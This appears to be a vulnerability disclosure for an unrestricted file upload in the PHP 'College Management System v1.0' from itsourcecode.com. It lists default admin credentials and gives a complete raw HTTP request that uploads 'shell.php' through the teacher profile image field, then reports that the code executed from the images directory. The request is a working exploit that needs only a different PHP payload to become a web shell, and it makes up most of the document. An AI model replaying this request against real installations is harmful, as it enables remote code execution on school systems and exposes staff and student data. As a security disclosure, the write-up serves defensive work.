# College Management System v1.0 by itsourcecode.com has arbitrary code execution (RCE)

Login account: admin@gmail.com/admin123* (Super Admin account)

vendor:  https://itsourcecode.com/free-projects/php-project/college-management-system-project-in-php-and-mysql/

Vulnerability url: /College/admin/teacher.ph

Vulnerability file: /College/admin/teacher.php

Payload:

```sql
POST /College/admin/teacher.php HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.1.19/College/admin/Teacher.php
Cookie: PHPSESSID=7g6mvmuq5m1o1cvqrhprll4jr1; ci_session=9cjop1qgnjcd780kijmjrva559enogjl
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------2754910320402
Content-Length: 3466

-----------------------------2754910320402
Content-Disposition: form-data; name="first_name"

1
-----------------------------2754910320402
Content-Disposition: form-data; name="middle_name"

1
-----------------------------2754910320402
Content-Disposition: form-data; name="last_name"

1
-----------------------------2754910320402
Content-Disposition: form-data; name="email"

111@qq.com
-----------------------------2754910320402
Content-Disposition: form-data; name="phone_no"

1
-----------------------------2754910320402
Content-Disposition: form-data; name="profile_image"; filename="shell.php"
Content-Type: application/octet-stream

JFJF
<?php phpinfo();?>
-----------------------------2754910320402
Content-Disposition: form-data; name="teacher_status"

Permanent
-----------------------------2754910320402
Content-Disposition: form-data; name="application_status"

Yes
-----------------------------2754910320402
Content-Disposition: form-data; name="cnic"

1
-----------------------------2754910320402
Content-Disposition: form-data; name="dob"

1
-----------------------------2754910320402
Content-Disposition: form-data; name="other_phone"

1
-----------------------------2754910320402
Content-Disposition: form-data; name="gender"

Male
-----------------------------2754910320402
Content-Disposition: form-data; name="permanent_address"

1
-----------------------------2754910320402
Content-Disposition: form-data; name="current_address"

1
-----------------------------2754910320402
Content-Disposition: form-data; name="place_of_birth"

1111
-----------------------------2754910320402
Content-Disposition: form-data; name="matric_complition_date"

1
-----------------------------2754910320402
Content-Disposition: form-data; name="matric_awarded_date"

1
-----------------------------2754910320402
Content-Disposition: form-data; name="matric_certificate"; filename=""
Content-Type: application/octet-stream


-----------------------------2754910320402
Content-Disposition: form-data; name="fa_complition_date"

1
-----------------------------2754910320402
Content-Disposition: form-data; name="fa_awarded_date"

1
-----------------------------2754910320402
Content-Disposition: form-data; name="fa_certificate"; filename=""
Content-Type: application/octet-stream


-----------------------------2754910320402
Content-Disposition: form-data; name="ba_complition_date"

1
-----------------------------2754910320402
Content-Disposition: form-data; name="ba_awarded_date"

1
-----------------------------2754910320402
Content-Disposition: form-data; name="ba_certificate"; filename=""
Content-Type: application/octet-stream


-----------------------------2754910320402
Content-Disposition: form-data; name="ma_complition_date"

1
-----------------------------2754910320402
Content-Disposition: form-data; name="ma_awarded_date"

1
-----------------------------2754910320402
Content-Disposition: form-data; name="ma_certificate"; filename=""
Content-Type: application/octet-stream


-----------------------------2754910320402
Content-Disposition: form-data; name="password"

teacher123*
-----------------------------2754910320402
Content-Disposition: form-data; name="role"

Teacher
-----------------------------2754910320402
Content-Disposition: form-data; name="btn_save"

Save Data
-----------------------------2754910320402--
```

The files will be uploaded to this directory \Admin\images

![image](https://user-images.githubusercontent.com/79501212/171629168-7db86e09-b3a7-4a43-8503-b2b972902dfd.png)

We visited the directory of the file in the browser and found that the code had been executed

![image](https://user-images.githubusercontent.com/79501212/171629319-8da12567-6f1a-4455-a65f-a61d9a3ccc5c.png)
